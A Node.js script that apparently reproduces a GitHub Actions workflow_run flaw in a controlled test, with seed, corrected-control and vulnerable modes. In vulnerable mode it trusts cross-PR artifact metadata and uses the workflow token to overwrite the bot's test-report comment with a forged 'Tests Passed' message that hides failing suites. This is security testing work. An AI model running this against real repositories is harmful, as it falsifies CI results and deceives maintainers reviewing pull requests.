import { readFile } from 'node:fs/promises'

const marker = '<!-- __NEXT_TEST_REPORT_COMMENT__ -->'
const [owner, repo] = process.env.GITHUB_REPOSITORY.split('/')
const token = process.env.GITHUB_TOKEN
const mode = process.env.GH016_MODE || 'vulnerable'

async function api(path, options = {}) {
  const response = await fetch(`https://api.github.com${path}`, {
    ...options,
    headers: {
      Accept: 'application/vnd.github+json',
      Authorization: `Bearer ${token}`,
      'X-GitHub-Api-Version': '2022-11-28',
      ...(options.headers || {}),
    },
  })
  if (!response.ok) {
    throw new Error(`${options.method || 'GET'} ${path} failed with HTTP ${response.status}`)
  }
  return response.status === 204 ? null : response.json()
}

async function commentsFor(number) {
  return api(`/repos/${owner}/${repo}/issues/${number}/comments?per_page=100`)
}

async function existingBotComment(number) {
  const comments = await commentsFor(number)
  return [...comments].reverse().find(
    (comment) =>
      comment.user?.login === 'github-actions[bot]' &&
      comment.body?.includes(marker)
  )
}

if (mode === 'seed') {
  const number = Number(process.env.PR_NUMBER)
  const existing = await existingBotComment(number)
  const body = `${marker}\n## Hosted Control Baseline\n\nNo attacker workflow has modified this comment.\n`
  if (existing) {
    await api(`/repos/${owner}/${repo}/issues/comments/${existing.id}`, {
      method: 'PATCH',
      body: JSON.stringify({ body }),
    })
    console.log(`SEED_RESET_COMMENT_ID=${existing.id} TARGET_PR=${number}`)
  } else {
    const created = await api(`/repos/${owner}/${repo}/issues/${number}/comments`, {
      method: 'POST',
      body: JSON.stringify({ body }),
    })
    console.log(`SEED_CREATED_COMMENT_ID=${created.id} TARGET_PR=${number}`)
  }
  process.exit(0)
}

const event = JSON.parse(await readFile(process.env.GITHUB_EVENT_PATH, 'utf8'))
const workflowRun = event.workflow_run
const candidate = JSON.parse(
  await readFile(process.env.PR_CI_METADATA_PATH || 'pr-ci-metadata/pr.json', 'utf8')
)
const pull = await api(
  `/repos/${owner}/${repo}/pulls/${Number(candidate.number)}`
)

const expectedHeadSha = candidate.headSha || workflowRun.head_sha
if (!expectedHeadSha || pull.head?.sha !== expectedHeadSha) {
  console.log('REJECTED_PR_HEAD_SHA_MISMATCH')
  process.exit(0)
}

const candidateMatchesWorkflowRun =
  (candidate.headSha && candidate.headSha === workflowRun.head_sha) ||
  Boolean(
    candidate.headRef &&
      candidate.headRepo &&
      workflowRun.head_branch &&
      workflowRun.head_repository?.full_name &&
      candidate.headRef === workflowRun.head_branch &&
      candidate.headRepo === workflowRun.head_repository.full_name
  )

if (!candidateMatchesWorkflowRun) {
  console.log('REJECTED_ARTIFACT_RUN_MISMATCH')
  process.exit(0)
}

if (mode === 'control') {
  const trustedIdentityMatches =
    pull.head?.sha === workflowRun.head_sha &&
    pull.head?.ref === workflowRun.head_branch &&
    pull.head?.repo?.full_name === workflowRun.head_repository?.full_name
  if (!trustedIdentityMatches) {
    console.log(
      `CONTROL_REJECTED_CROSS_PR TARGET_PR=${pull.number} RUN_ID=${workflowRun.id}`
    )
    process.exit(0)
  }
  throw new Error('corrected control unexpectedly accepted cross-PR metadata')
}

const existing = await existingBotComment(pull.number)
if (!existing) {
  throw new Error('expected seeded github-actions[bot] comment was not found')
}

const body = [
  marker,
  '## Tests Passed',
  '',
  '<!-- ## Failing test suites -->',
  `Commit: ${pull.head.sha}`,
  '',
].join('\n')

await api(`/repos/${owner}/${repo}/issues/comments/${existing.id}`, {
  method: 'PATCH',
  body: JSON.stringify({ body }),
})
console.log(
  `EXPLOIT_PATCHED_COMMENT_ID=${existing.id} TARGET_PR=${pull.number} RUN_ID=${workflowRun.id}`
)
